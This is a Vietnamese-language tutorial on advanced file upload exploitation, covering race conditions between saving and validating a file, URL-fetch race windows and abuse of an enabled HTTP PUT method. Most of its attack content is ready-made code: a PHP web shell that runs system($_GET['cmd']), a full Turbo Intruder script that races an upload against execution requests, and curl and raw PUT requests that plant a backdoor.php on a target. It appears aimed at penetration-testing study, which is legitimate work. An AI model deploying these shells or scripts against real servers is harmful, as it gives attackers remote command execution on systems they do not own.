# Exploiting File Upload (Khai thác lỗ hổng tải lên tệp nâng cao)

Tài liệu này cung cấp hướng dẫn chi tiết về các kỹ thuật khai thác lỗ hổng tải lên tệp nâng cao, tập trung vào các lỗi logic trong quy trình xử lý của máy chủ như **Race Conditions** (Điều kiện tranh chấp) và cấu hình sai **HTTP PUT**.

---

## 1. Race Conditions (Điều kiện tranh chấp)

### Cơ chế hoạt động (Tại sao lỗi này tồn tại?)
Lỗ hổng này xảy ra khi ứng dụng thực hiện việc **lưu tệp trước** rồi mới **kiểm tra xác thực sau**. Đây là lỗi logic dạng "Time of Check to Time of Use" (TOCTOU).

**Quy trình xử lý không an toàn:**
1.  **Upload**: Người dùng gửi file `shell.php`.
2.  **Save**: Server lưu file vào thư mục gốc (ví dụ: `/uploads/shell.php`).
3.  **Validate**: Server chạy trình quét virus hoặc kiểm tra định dạng ảnh.
4.  **Delete**: Nếu file không hợp lệ, server xóa file `shell.php`.

**Vấn đề**: Giữa bước 2 (Lưu) và bước 4 (Xóa) tồn tại một khoảng thời gian nhỏ (vài mili giây đến vài giây). Trong "cửa sổ thời gian" (race window) này, file `shell.php` thực sự tồn tại trên server và có thể truy cập được.

### Kịch bản khai thác chi tiết

Để khai thác, bạn cần thực hiện tấn công "Brute-force" về mặt thời gian: gửi yêu cầu thực thi file ngay khi nó vừa được tải lên nhưng chưa kịp bị xóa.

#### Bước 1: Chuẩn bị Payload
Tạo file `shell.php` với nội dung đơn giản để xác nhận mã đã chạy:
```php
<?php echo "VULNERABLE: " . system($_GET['cmd']); ?>
```

#### Bước 2: Sử dụng Turbo Intruder (Burp Suite)
Đây là cách hiệu quả nhất vì Turbo Intruder có thể gửi request cực nhanh.

1.  Gửi request **POST /upload** tới Turbo Intruder.
2.  Sử dụng script Python sau trong Turbo Intruder:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    # Tạo 2 loại request: 1 là upload, 2 là get file
    request1 = '''POST /upload HTTP/1.1
Host: vulnerable-website.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
...
Content-Disposition: form-data; name="avatar"; filename="shell.php"

<?php echo system($_GET['cmd']); ?>
------WebKitFormBoundary--
'''

    request2 = '''GET /uploads/shell.php?cmd=whoami HTTP/1.1
Host: vulnerable-website.com
'''

    # Gửi xen kẽ liên tục
    for i in range(1000):
        engine.queue(request1) # Upload
        for x in range(5):
            engine.queue(request2) # Cố gắng truy cập ngay lập tức

def handleResponse(req, interesting):
    # Nếu server trả về 200 OK cho request GET, nghĩa là ta đã thắng race condition
    if req.status == 200 and "VULNERABLE" in req.response:
        table.add(req)
```

#### Bước 3: Phân tích kết quả
*   Nếu bạn thấy một response `200 OK` từ request `GET` có chứa output của lệnh `whoami`, bạn đã khai thác thành công.

---

## 2. URL-based File Upload Race Conditions

### Cơ chế hoạt động
Thay vì upload file từ máy tính, người dùng cung cấp một URL để server tự tải về (tính năng "Fetch from URL").

**Quy trình:**
1.  Server nhận URL từ người dùng.
2.  Server tải file từ URL đó về một thư mục tạm (thường có tên ngẫu nhiên).
3.  Server kiểm tra file.
4.  Nếu hợp lệ -> Di chuyển sang thư mục chính. Nếu không -> Xóa.

**Lỗ hổng**: Nếu kẻ tấn công có thể đoán được tên thư mục tạm hoặc tên file tạm thời, họ có thể truy cập file trong khi server đang tải nó về hoặc đang xử lý nó.

### Kỹ thuật khai thác

1.  **Kéo dài thời gian xử lý**:
    *   Tạo một file payload rất nặng (ví dụ: 10MB) nhưng chứa mã độc PHP ở ngay đầu file.
    *   Việc tải file lớn sẽ làm tăng "race window", cho bạn nhiều thời gian hơn để đoán tên file.

2.  **Đoán tên file tạm (Brute-force)**:
    *   Nếu server dùng hàm tạo tên ngẫu nhiên yếu (như `uniqid()` của PHP hoặc timestamp), bạn có thể brute-force tên file.

---

## 3. HTTP PUT Method

### Mô tả
Một số Web Server (Apache, Tomcat, Nginx) nếu cấu hình sai module `mod_dav` hoặc cho phép method `PUT` công khai, kẻ tấn công có thể tải file lên bất kỳ đâu mà không cần thông qua chức năng upload của ứng dụng web.

### Các bước kiểm tra và khai thác

#### Bước 1: Kiểm tra Method
Sử dụng `curl` hoặc Burp Repeater gửi request `OPTIONS`:
```http
OPTIONS /images/ HTTP/1.1
Host: target.com
```
*Nếu response header `Allow` có chứa `PUT`, server có thể bị lỗi này.*

#### Bước 2: Upload Shell
Gửi request `PUT` để tạo file mới:

```bash
curl -X PUT -d "<?php system(\$_GET['cmd']); ?>" http://target.com/images/backdoor.php
```

Hoặc Raw Request:
```http
PUT /images/backdoor.php HTTP/1.1
Host: target.com
Content-Type: application/x-httpd-php
Content-Length: 26

<?php system($_GET['cmd']); ?>
```

#### Bước 3: Xóa file (Dọn dẹp)
Nếu server hỗ trợ `DELETE`, hãy xóa file sau khi kiểm tra:
```bash
curl -X DELETE http://target.com/images/backdoor.php
```
